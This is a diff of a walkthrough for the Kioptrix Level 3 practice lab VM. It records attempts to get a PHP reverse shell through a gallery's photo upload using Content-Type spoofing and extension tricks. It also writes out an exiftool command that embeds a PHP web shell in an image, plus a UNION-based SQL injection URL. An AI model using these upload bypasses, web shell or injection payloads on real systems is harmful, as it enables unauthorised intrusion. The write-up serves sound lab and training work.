@@ -97,9 +97,21 @@ By Kioptrix
 * The set of credentials which we had obtained from the SQL injection is `admin:n0t7t1k4`. Tried it on `http://10.0.2.15/index.php?system=Admin` and `http://10.0.2.15/phpmyadmin/`, but both failed to log us in. Finally, I tried it on `http://10.0.2.15/gallery/gadmin/` and we are in!
 ![](/screenshots/kioptrix-level-3/httpGalleryGadminLoginSuccess.jpg)
 * The `Comments` system is disabled, as shown from the missing `/comments.php` when trying to `View comments` from the `Dashboard`.
+* Heading to `Presentation` > `Theme Editor`, we find that we are able to view the source code of various parts of the Gallarific site. However, we do not have permissions to edit the source code.
+![](/screenshots/kioptrix-level-3/httpGalleryThemeEditor.jpg)
+* Since we could not edit the source code manually, I headed to `Themes` and managed to change the theme to another colour, which contains the original general Gallarific template. We are able to see the new changes at `http://kioptrix3.com/gallery/`. Nothing much that is unexpected. 
 * Navigating to `Users`, I found that we as `admin` (with the `Super User` role), were the only user on the platform.
-* I tried to upload the standard `php-reverse-shell` (by pentestmonkey) as .php and .img but both did not execute as code.
-* I also tried to [embed shell code into an image](https://www.youtube.com/watch?v=nNB9XlRfvzw0), but my efforts probably all did not work because each image did not retain its original file name and extension, and when trying to access the image, we see the file name being some random string, e.g. `92k26hge4q.jpg` with a .jpg file extension.
+* I found out that we were able to head to `Photos` and `Upload Photos`. I tried the following ways to get our PHP-reverse-shell code executed (the port intended for the reverse shell connection was `80` (just in case there is a firewall): (No matter what we uploaded, the file extension was always `.jpg`)
+1. Uploading `php-reverse-shell.php` (by pentestmonkey) as it is - file name generated in `.jpg`, but not saved into `images` directory.
+2. Case 1, but this time, I intercepted the request made by a legitimate photo upload, found its Content-Type to be `image/jpeg`, versus the Content-Type of Case 1 which was `application/x-php`, and modified Case 1's Content-Type to be the one accepted by a legitimate photo upload.
+* Our 'image' is now saved into the `images` directory as a `.jpg`, but our code is still not executed.
+![](/screenshots/kioptrix-level-3/httpGalleryUploadNewPhotoRequestChangeContentType.jpg)
+* Doing a GET request for our `image` shows that our code remains intact, but the Content-Type remains to be `image/jpeg`. On one hand, it allowed for our shell code to be uploaded, but on the other hand, we cannot now trigger the execution of the code.
+![](/screenshots/kioptrix-level-3/httpGalleryGetRequestForImageWithCode.jpg)
+3. Uploading `php-reverse-shell.php.jpg` (only change in file extension - file contents not modified) - saved into `images` directory as `.jpg` file, but displays an error to say that "the image cannot be displayed because it contains errors". Same output as Case 2.
+4. Run `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' goat.jpg` on a legitimate image - this involves [embedding shell code into an image](https://www.youtube.com/watch?v=nNB9XlRfvzw0). Loading `http://kioptrix3.com/gallery/photos/41980v2zfb.jpg?cmd=id` yielded nothing. Somehow
+I could not manage to get Burp Suite to intercept both the request and response regarding the GET request for the image, but our browser tools showed that what was returned was simply the image itself.
+5. The `GIF89a?` way of adding it to the beginning of the code (and leaving the file extension as .php) does not work here (very likely because the file extension check is done at the `Content-Type` parameter only), and results in the same result in Case 1.
 * Without being able to find a way to get a shell from the admin panel, I went back to the SQL injection vulnerability to look for a way to do so.
 * First, I tried to figure out what we could do:
 1. Getting SQL database version `5.0.51a-3ubuntu5.4`: `/gallery.php?id=null+and+1=2+union+select+1,@@version,3,4,5,6+from+gallarific_users--`
